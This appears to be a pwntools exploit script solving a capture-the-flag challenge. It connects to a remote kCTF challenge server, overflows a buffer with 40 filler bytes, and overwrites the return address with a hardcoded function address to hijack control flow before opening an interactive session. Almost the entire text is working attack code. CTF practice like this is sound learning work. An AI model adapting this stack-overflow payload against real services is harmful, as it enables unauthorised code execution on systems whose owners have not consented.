from pwn import *

# Set up connection to the remote server
host = "p0wn3d3.kctf-453514-codelab.kctf.cloud"
port = 1337

# Create a remote connection
p = remote(host, port)

elf = context.binary = ELF('./chal')

# p = process()
# p = gdb.debug('./chal', '''
# b *main+45
# continue
# ''')

p.recvuntil('before')
payload = b'B'*(32+8)
payload += p64(0x004011a5)


p.sendline(payload)

p.interactive()